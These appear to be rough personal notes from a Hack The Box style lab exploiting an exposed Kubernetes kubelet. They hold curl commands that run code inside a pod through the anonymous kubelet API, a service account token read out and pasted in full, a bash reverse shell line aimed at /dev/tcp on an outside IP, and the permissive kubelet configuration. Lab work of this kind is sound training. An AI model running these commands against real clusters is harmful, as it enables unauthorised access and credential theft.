10.129.96.167
maybe need to get token 

https://<master_ip>:<port>/api/v1/namespaces/kube-system/secrets/


looks like anonymous auth is disabled?


enumerate running pods
curl -sk https://$HTBHOST:10250/runningpods/

containers":[{"name":"nginx","image":"sha256:295c7be079025306c4f1d
65997fcf7adb411c88f139ad1d34b537164aa060369","resources":{}}]},"status":{}},{"metada
ta":{"name":"kube-proxy-gd6q6","namespace":"kube-system","uid":"1b8c5c7e-1691-4a7b-a
f7e-aad5d9eb57d2","creationTimestamp":null}

namespace: default
pod name: nginx
name: nginx


curl -sk https://$HTBHOST:10250/run/default/nginx/nginx/ -d "cmd=id"

└─$ curl -sk https://$HTBHOST:10250/run/default/nginx/nginx/ -d "cmd=cat /run/secrets/kubernetes.io/serviceaccount/token"eyJhbGciOiJSUzI1NiIsImtpZCI6IkxXckt5NEFtMG9TeFAwcUJYaktRNjZiVDFhMDMyXy11QkRpNVd1eERPRnMifQ.eyJhdWQiOlsiaHR0cHM6Ly9rdWJlcm5ldGVzLmRlZmF1bHQuc3ZjLmNsdXN0ZXIubG9jYWwiXSwiZXhwIjoxODA0NTQyNzMxLCJpYXQiOjE3NzMwMDY3MzEsImlzcyI6Imh0dHBzOi8va3ViZXJuZXRlcy5kZWZhdWx0LnN2Yy5jbHVzdGVyLmxvY2FsIiwia3ViZXJuZXRlcy5pbyI6eyJuYW1lc3BhY2UiOiJkZWZhdWx0IiwicG9kIjp7Im5hbWUiOiJuZ2lueCIsInVpZCI6ImJhYjhmMWY2LTM4ODItNGNmYS05NDRkLTJiZjE1OTVhNGJmOSJ9LCJzZXJ2aWNlYWNjb3VudCI6eyJuYW1lIjoiZGVmYXVsdCIsInVpZCI6IjNmNmEyMzQxLTNmMDQtNDU3MS1hZjI5LTU0MzllNDg5OWJlOSJ9LCJ3YXJuYWZ0ZXIiOjE3NzMwMTAzMzh9LCJuYmYiOjE3NzMwMDY3MzEsInN1YiI6InN5c3RlbTpzZXJ2aWNlYWNjb3VudDpkZWZhdWx0OmRlZmF1bHQifQ.ACA3M2q683XM4TP7T8iLD3S4UQnlsddFg426KZwgSPMarOPCvKnKODU3TVL9ynB6Db9qCdwIL1-PEtvzpQB0mZ5ZZ-G6zcP46vPc2wngz98v0u41OuTzdRMFHQ7dUjcwZ8jtd_DZKt-K762JJfLOkdIoxRc6po4GZhmoF0-JkiI8MJCPyx0IHzJDMl7M00qlii7utV-W3ll9WOmiUe8bICo5tox5DjVXwDy_Do8rxYhe2gcRIuHf0TUwpNzTfd47VA4qi2UmUY-iIerB6gqVx_npVze8Aq6mMVEt0oGI0pCE9VTcD1RJvRG0dMtlbdfsdsvGsOjokipy6CskhEoI3A                 

maybe goal is shell on the control plane or something?
i dont think the pods have any ssh keys or anything

eyJhbGciOiJSUzI1NiIsImtpZCI6IkxXckt5NEFtMG9TeFAwcUJYaktRNjZiVDFhMDMyXy11QkRpNVd1eERPRnMifQ.eyJhdWQiOlsiaHR0cHM6Ly9rdWJlcm5ldGVzLmRlZmF1bHQuc3ZjLmNsdXN0ZXIubG9jYWwiXSwiZXhwIjoxODA0NTQyNzMxLCJpYXQiOjE3NzMwMDY3MzEsImlzcyI6Imh0dHBzOi8va3ViZXJuZXRlcy5kZWZhdWx0LnN2Yy5jbHVzdGVyLmxvY2FsIiwia3ViZXJuZXRlcy5pbyI6eyJuYW1lc3BhY2UiOiJkZWZhdWx0IiwicG9kIjp7Im5hbWUiOiJuZ2lueCIsInVpZCI6ImJhYjhmMWY2LTM4ODItNGNmYS05NDRkLTJiZjE1OTVhNGJmOSJ9LCJzZXJ2aWNlYWNjb3VudCI6eyJuYW1lIjoiZGVmYXVsdCIsInVpZCI6IjNmNmEyMzQxLTNmMDQtNDU3MS1hZjI5LTU0MzllNDg5OWJlOSJ9LCJ3YXJuYWZ0ZXIiOjE3NzMwMTAzMzh9LCJuYmYiOjE3NzMwMDY3MzEsInN1YiI6InN5c3RlbTpzZXJ2aWNlYWNjb3VudDpkZWZhdWx0OmRlZmF1bHQifQ.ACA3M2q683XM4TP7T8iLD3S4UQnlsddFg426KZwgSPMarOPCvKnKODU3TVL9ynB6Db9qCdwIL1-PEtvzpQB0mZ5ZZ-G6zcP46vPc2wngz98v0u41OuTzdRMFHQ7dUjcwZ8jtd_DZKt-K762JJfLOkdIoxRc6po4GZhmoF0-JkiI8MJCPyx0IHzJDMl7M00qlii7utV-W3ll9WOmiUe8bICo5tox5DjVXwDy_Do8rxYhe2gcRIuHf0TUwpNzTfd47VA4qi2UmUY-iIerB6gqVx_npVze8Aq6mMVEt0oGI0pCE9VTcD1RJvRG0dMtlbdfsdsvGsOjokipy6CskhEoI3A

curl -sk https://$HTBHOST:10250/run/default/nginx/nginx/ -d "cmd=bash -i >& /dev/tcp/10.10.14.205/4444 0>&1"

pipes / redirect is not helping; not sure if it's some syntax issue?


how get a reverse shell, and then escape?
https://www.covertswarm.com/post/k8s-pod-to-node-escape-techniques

curl not working / wget not working



└─$ kubeletctl -s $HTBHOST exec "/bin/bash" -p nginx -c nginx
maybe next step is to use rbac?


random memory error in kubeletctl
panic: runtime error: invalid memory address or nil pointer dereference
[signal SIGSEGV: segmentation violation code=0x1 addr=0x40 pc=0xb6cc0e]

goroutine 1 [running]:
kubeletctl/cmd.PrintPrettyHttpResponse(0x0, {0xc000318860?, 0xc00021fd48?})
        /home/cyber/kubeletctl/kubeletctl/cmd/print.go:56 +0x2e
kubeletctl/cmd/proxy.glob..func3(0x1323aa0?, {0xcd483c?, 0x0?, 0x0?})
        /home/cyber/kubeletctl/kubeletctl/cmd/proxy/configz.go:44 +0x4f
github.com/spf13/cobra.(*Command).execute(0x1323aa0, {0x13683a8, 0x0, 0x0})
        /root/go/pkg/mod/github.com/spf13/cobra@v0.0.7/command.go:842 +0x663
github.com/spf13/cobra.(*Command).ExecuteC(0x1322060)
        /root/go/pkg/mod/github.com/spf13/cobra@v0.0.7/command.go:943 +0x37d
github.com/spf13/cobra.(*Command).Execute(...)
        /root/go/pkg/mod/github.com/spf13/cobra@v0.0.7/command.go:883
kubeletctl/cmd.Execute()
        /home/cyber/kubeletctl/kubeletctl/cmd/root.go:83 +0x25
main.main()
        /home/cyber/kubeletctl/kubeletctl/main.go:21 +0x17
                                                                                                    
┌

{
  "kubeletconfig": {
    "enableServer": true,
    "staticPodPath": "/etc/kubernetes/manifests",
    "syncFrequency": "1m0s",
    "fileCheckFrequency": "20s",
    "httpCheckFrequency": "20s",
    "address": "0.0.0.0",
    "port": 10250,
    "tlsCertFile": "/var/lib/kubelet/pki/kubelet.crt",
    "tlsPrivateKeyFile": "/var/lib/kubelet/pki/kubelet.key",
    "rotateCertificates": true,
    "authentication": {
      "x509": {
        "clientCAFile": "/var/lib/minikube/certs/ca.crt"
      },
      "webhook": {
        "enabled": true,
        "cacheTTL": "2m0s"
      },
      "anonymous": {
        "enabled": true
      }
    },
    "authorization": {
      "mode": "AlwaysAllow",
      "webhook": {
        "cacheAuthorizedTTL": "5m0s",
        "cacheUnauthorizedTTL": "30s"
      }
    },
    "registryPullQPS": 5,
    "registryBurst": 10,
    "eventRecordQPS": 5,
    "eventBurst": 10,
    "enableDebuggingHandlers": true,
    "healthzPort": 10248,
    "healthzBindAddress": "127.0.0.1",
    "oomScoreAdj": -999,
    "clusterDomain": "cluster.local",
    "clusterDNS": ["10.96.0.10"],
    "streamingConnectionIdleTimeout": "4h0m0s",
    "nodeStatusUpdateFrequency": "10s",
    "nodeStatusReportFrequency": "5m0s",
    "nodeLeaseDurationSeconds": 40,
    "imageMinimumGCAge": "2m0s",
    "imageGCHighThresholdPercent": 100,
    "imageGCLowThresholdPercent": 80,
    "volumeStatsAggPeriod": "1m0s",
    "cgroupsPerQOS": true,
    "cgroupDriver": "cgroupfs",
    "cpuManagerPolicy": "none",
    "cpuManagerReconcilePeriod": "10s",
    "memoryManagerPolicy": "None",
    "topologyManagerPolicy": "none",
    "topologyManagerScope": "container",
    "runtimeRequestTimeout": "2m0s",
    "hairpinMode": "promiscuous-bridge",
    "maxPods": 110,
    "podPidsLimit": -1,
    "resolvConf": "/etc/resolv.conf",
    "cpuCFSQuota": true,
    "cpuCFSQuotaPeriod": "100ms",
    "nodeStatusMaxImages": 50,
    "maxOpenFiles": 1000000,
    "contentType": "application/vnd.kubernetes.protobuf",
    "kubeAPIQPS": 5,
    "kubeAPIBurst": 10,
    "serializeImagePulls": true,
    "evictionHard": {
      "imagefs.available": "0%",
      "nodefs.available": "0%",
      "nodefs.inodesFree": "0%"
    },
    "evictionPressureTransitionPeriod": "5m0s",
    "enableControllerAttachDetach": true,
    "makeIPTablesUtilChains": true,
    "iptablesMasqueradeBit": 14,
    "iptablesDropBit": 15,
    "failSwapOn": false,
    "memorySwap": {},
    "containerLogMaxSize": "10Mi",
    "containerLogMaxFiles": 5,
    "configMapAndSecretChangeDetectionStrategy": "Watch",
    "enforceNodeAllocatable": ["pods"],
    "volumePluginDir": "/usr/libexec/kubernetes/kubelet-plugins/volume/exec/",
    "logging": {
      "format": "text"
    },
    "enableSystemLogHandler": true,
    "shutdownGracePeriod": "0s",
    "shutdownGracePeriodCriticalPods": "0s",
    "enableProfilingHandler": true,
    "enableDebugFlagsHandler": true,
    "seccompDefault": false,
    "memoryThrottlingFactor": 0.8
  }
}




  "aud": [
    "https://kubernetes.default.svc.cluster.local"
  ],
  "exp": 1804542731,
  "iat": 1773006731,
  "iss": "https://kubernetes.default.svc.cluster.local",
  "kubernetes.io": {
    "namespace": "default",
    "pod": {
      "name": "nginx",
      "uid": "bab8f1f6-3882-4cfa-944d-2bf1595a4bf9"
    },
    "serviceaccount": {
      "name": "default",
      "uid": "3f6a2341-3f04-4571-af29-5439e4899be9"
    },
    "warnafter": 1773010338
  },
  "nbf": 1773006731,
  "sub": "system:serviceaccount:default:default"
}

eyJhbGciOiJSUzI1NiIsImtpZCI6IkxXckt5NEFtMG9TeFAwcUJYaktRNjZiVDFhMDMyXy11QkRpNVd1eERPRnMifQ.eyJhdWQiOlsiaHR0cHM6Ly9rdWJlcm5ldGVzLmRlZmF1bHQuc3ZjLmNsdXN0ZXIubG9jYWwiXSwiZXhwIjoxODA0NTU0NDc4LCJpYXQiOjE3NzMwMTg0NzgsImlzcyI6Imh0dHBzOi8va3ViZXJuZXRlcy5kZWZhdWx0LnN2Yy5jbHVzdGVyLmxvY2FsIiwia3ViZXJuZXRlcy5pbyI6eyJuYW1lc3BhY2UiOiJkZWZhdWx0IiwicG9kIjp7Im5hbWUiOiJuZ2lueCIsInVpZCI6ImJhYjhmMWY2LTM4ODItNGNmYS05NDRkLTJiZjE1OTVhNGJmOSJ9LCJzZXJ2aWNlYWNjb3VudCI6eyJuYW1lIjoiZGVmYXVsdCIsInVpZCI6IjNmNmEyMzQxLTNmMDQtNDU3MS1hZjI5LTU0MzllNDg5OWJlOSJ9LCJ3YXJuYWZ0ZXIiOjE3NzMwMjIwODV9LCJuYmYiOjE3NzMwMTg0NzgsInN1YiI6InN5c3RlbTpzZXJ2aWNlYWNjb3VudDpkZWZhdWx0OmRlZmF1bHQifQ.WNKrd5N4H7XGlzO_fkX1_Ok80twnKjgy--1fmGTT0g-qTbbedhsOUY4jlKlqvAy_2s8zaqZAQiSXbyq0bJPzSz_7dv319SamDPDAA9q_uv7spVwgpgNDwZPacQ-G-f3xSxWQLmljtPPKGaboRbNd-Sh1CnrY0s62qTDe59WeAXUoA7WF4yubR14Hq8gXCy_2XpeuIkIuWWn5ae34757jQmQYdcG31u3r8CZ7jFlE67f3Q1IYQscP4cgQZUQs-lfRrPk6nN9gvJGW8Xf6w7_swIDgrxnxHHFDnJSYCXW7fOUXABPi6cz_jWA4ITpwH5Wo7A3D0dOS9ipkp3vm4bvsaQ




